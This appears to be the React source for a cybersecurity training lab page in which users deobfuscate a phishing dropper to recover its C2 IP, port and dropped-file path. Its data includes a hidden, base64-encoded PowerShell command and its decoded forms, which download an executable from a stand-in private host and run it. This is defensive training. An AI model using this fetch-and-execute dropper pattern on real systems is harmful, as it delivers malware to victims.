import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { CyberCard } from "@/components/cyber/CyberCard";
import { LabFrame } from "@/components/labs/LabFrame";
import { CyberButton } from "@/components/cyber/CyberButton";
import { FileTerminal, Search, CheckCircle2 } from "lucide-react";

export const Route = createFileRoute("/labs/phishing-payload")({
  head: () => ({
    meta: [
      { title: "Phishing Payload Analysis — Straxon Secure" },
      {
        name: "description",
        content:
          "Deobfuscate a malicious email dropper to extract the Command & Control (C2) server IP.",
      },
    ],
  }),
  component: PhishingPayloadLab,
});

const PAYLOAD_STAGES = [
  // Stage 0: Obfuscated Base64
  "powershell.exe -w hidden -enc JAB1AD0AJwBoACcAKwAnAHQAdAAnACsAJwBwADoAJwArACcALwAvACcAKwAnADEAOQAyACcAKwAnAC4AMQA2ACcAKwAnADgALgAxACcAKwAnAC4ANAAoACcAKwAnADQAOgA0ACcAKwAnADQANAAoACcAKwAnAC8AJwArACcAcABhACcAKwAnAHkAbABvACcAKwAnAGEAZAAuACcAKwAnAGUAeAAnACsAJwBlACcAOwAgACQAcAA9ACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABtAHMALgBlAHgAZQAnADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1ACAALQBPAHUAdABGAGkAbABlACAAJABwADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABwADsA",
  // Stage 1: Base64 Decoded (shows string concat)
  "$u='h'+'tt'+'p:'+'//'+'192'+'.16'+'8.1'+'.4'+'4:4'+'44'+'4/'+'pa'+'ylo'+'ad.'+'ex'+'e'; $p='C:\\Windows\\Temp\\ms.exe'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process $p;",
  // Stage 2: String Concat resolved
  "$u='http://192.168.1.44:4444/payload.exe'; $p='C:\\Windows\\Temp\\ms.exe'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process $p;",
];

function PhishingPayloadLab() {
  const [stage, setStage] = useState(0);
  const [analyzing, setAnalyzing] = useState(false);
  const [currentPayload, setCurrentPayload] = useState(PAYLOAD_STAGES[0]);

  const processStage = async () => {
    setAnalyzing(true);
    try {
      const mlUrl = import.meta.env.VITE_ML_ENGINE_URL || "http://localhost:8082";
      const res = await fetch(`${mlUrl}/api/ml/deobfuscate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ payload: currentPayload, stage }),
      });
      const data = await res.json();
      if (data.result) {
        setCurrentPayload(data.result);
      }
    } catch (e) {
      console.error("Backend error, falling back:", e);
      setCurrentPayload(PAYLOAD_STAGES[Math.min(stage + 1, 2)]);
    }
    setStage((s) => Math.min(s + 1, 2));
    setAnalyzing(false);
  };

  return (
    <LabFrame title="MALICIOUS PAYLOAD ANALYSIS" badge="LAB-PHY" recorderLab="phishing-payload">
      <p className="text-slate-400 max-w-3xl mb-6 font-mono text-sm leading-relaxed">
        An executive received a suspicious email titled "URGENT: Q3 Invoice PDF". The attachment was
        actually a malicious shortcut (.LNK) file that executed a PowerShell command. Deobfuscate
        the script to extract the attacker's C2 server IP address.
      </p>

      <div className="grid lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-6">
          <CyberCard variant="magenta" className="p-5">
            <h3 className="font-mono text-xs uppercase text-[#ff003c] mb-4 flex items-center gap-2">
              <FileTerminal className="h-4 w-4" /> Dropper Script Content
            </h3>
            <div className="bg-[#020610] p-4 rounded border border-white/10 font-mono text-[11px] text-slate-300 min-h-[150px] whitespace-pre-wrap break-all leading-relaxed">
              {currentPayload}
            </div>
          </CyberCard>

          <div className="flex gap-4">
            {stage === 0 && (
              <CyberButton
                variant="cyan"
                onClick={processStage}
                disabled={analyzing}
                className="flex-1 text-center justify-center"
              >
                {analyzing ? "Decoding Base64..." : "Decode Base64 Execution (-enc)"}
              </CyberButton>
            )}
            {stage === 1 && (
              <CyberButton
                variant="cyan"
                onClick={processStage}
                disabled={analyzing}
                className="flex-1 text-center justify-center"
              >
                {analyzing ? "Resolving strings..." : "Resolve String Concatenation (+)"}
              </CyberButton>
            )}
            {stage === 2 && (
              <div className="bg-emerald-500/10 border border-emerald-500/30 p-4 rounded text-center w-full flex items-center justify-center gap-3">
                <CheckCircle2 className="h-6 w-6 text-emerald-400" />
                <span className="font-mono font-bold text-emerald-400">
                  PAYLOAD FULLY DEOBFUSCATED
                </span>
              </div>
            )}
          </div>
        </div>

        <div className="lg:col-span-1">
          <CyberCard variant="plain" className="p-5 h-full">
            <h3 className="font-mono text-xs uppercase text-slate-400 mb-6 flex items-center gap-2">
              <Search className="h-4 w-4" /> Extraction Goals
            </h3>

            <div className="space-y-6">
              <div>
                <div className="text-[10px] text-slate-500 uppercase font-mono mb-1">
                  C2 IP Address
                </div>
                <div
                  className={`font-mono text-sm transition-all duration-1000 ${stage === 2 ? "text-[#00f3ff]" : "text-slate-600 blur-sm"}`}
                >
                  192.168.1.44
                </div>
              </div>

              <div>
                <div className="text-[10px] text-slate-500 uppercase font-mono mb-1">C2 Port</div>
                <div
                  className={`font-mono text-sm transition-all duration-1000 ${stage === 2 ? "text-[#00f3ff]" : "text-slate-600 blur-sm"}`}
                >
                  4444
                </div>
              </div>

              <div>
                <div className="text-[10px] text-slate-500 uppercase font-mono mb-1">
                  Dropped Binary Path
                </div>
                <div
                  className={`font-mono text-sm transition-all duration-1000 ${stage === 2 ? "text-yellow-400" : "text-slate-600 blur-sm"}`}
                >
                  C:\Windows\Temp\ms.exe
                </div>
              </div>
            </div>
          </CyberCard>
        </div>
      </div>
    </LabFrame>
  );
}
